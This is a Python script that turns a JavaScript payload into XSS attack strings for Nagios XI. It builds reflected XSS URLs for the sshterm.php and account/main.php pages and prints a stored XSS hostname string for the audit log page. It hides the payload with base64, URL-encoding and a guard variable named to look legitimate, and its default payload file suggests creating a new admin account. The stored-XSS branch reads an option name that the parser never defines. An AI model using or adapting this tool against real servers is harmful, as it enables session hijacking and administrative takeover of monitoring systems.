#!/usr/bin/python3
from jsmin import jsmin
import argparse
import sys
import base64
import urllib.parse
import html

parser = argparse.ArgumentParser(
    sys.argv[0],
    description="Package a payload for XSS",
)
parser.add_argument("payload", help="Javascript payload file", default="new-admin-payload.js")
parser.add_argument("--sshterm", help="Setup payload for reflected XSS on /nagiosxi/admin/sshterm.php", action="store_true")
parser.add_argument("--account", help="Setup payload for reflected XSS on /nagiosxi/account/main.php", action="store_true")
parser.add_argument("--auditlog", help="Setup payload for stored XSS on /nagiosxi/admin/auditlog.php?mode=view-configure", action="store_true")
parser.add_argument("--stored-hostname", help="Hostname to display for stored XSS payload", default="")
parser.add_argument("--host", help="Host url of nagios instance(https://nagios.lan)", default="")

args = parser.parse_args()

if not any([args.sshterm, args.account, args.auditlog]):
    print('Please specify one of --sshterm, --account, or --auditlog')
    exit(1)

# add trailing slash if necessary to host value
host = ""
if (args.host.endswith("/")):
    host = args.host
else:
    host = args.host + "/"


# minify
minified = ""
with open(args.payload) as js_file:
    rawPayload = js_file.read()
    if (args.account):
        # onfocus multiple execution prevention, nsp_prot so it just looks like something that's legit
        rawPayload = "if (!window.nsp_prot) { " + rawPayload + ";window.nsp_prot = true; }"
    minified = jsmin(rawPayload, quote_chars="'\"`")


# some obfuscation
b64payload = base64.b64encode(minified.encode('utf8')).decode('utf8')

if (args.account):

    # url encoded code to eval the base64 payload
    prefix = "%73%65%74%54%69%6D%65%6F%75%74%28%61%74%6F%62%28%27" # setTimeout(atob('
    suffix = "%27%29%29" # '))
    payload = prefix + urllib.parse.quote_plus(b64payload) + suffix

    # build payload url, api_key=" onfocus="console.log('payload here')" autofocus h="
    url = host + "nagiosxi/account/main.php?%61%70%69%5F%6B%65%79=%22%20%6F%6E%66%6F%63%75%73%3D%22" + payload + "%22%20%61%75%74%6F%66%6F%63%75%73%20h=%22"
    print(url)

elif (args.sshterm):

    # add code to eval the base64 payload
    prefix = "setTimeout(atob(\""
    suffix = "\"))"
    payload = prefix + b64payload + suffix

    # build payload url
    encodedPayload = urllib.parse.quote_plus(html.escape(payload))
    url = host + "nagiosxi/admin/sshterm.php?url=%3F%22%20srcdoc%3D%22%26lt%3B%73%63%72%69%70%74%26gt%3B" + encodedPayload + "%26lt%3B/%73%63%72%69%70%74%26gt%3B"
    print(url)

elif (args.auditlog):

    print('Enter the following for the hostname field at /nagiosxi/admin/auditlog.php?mode=view-configure:\n')
    print(f'{args.hostname}" style="animation: twirl 0s;" onanimationstart="setTimeout(atob(\'{b64payload}\'))')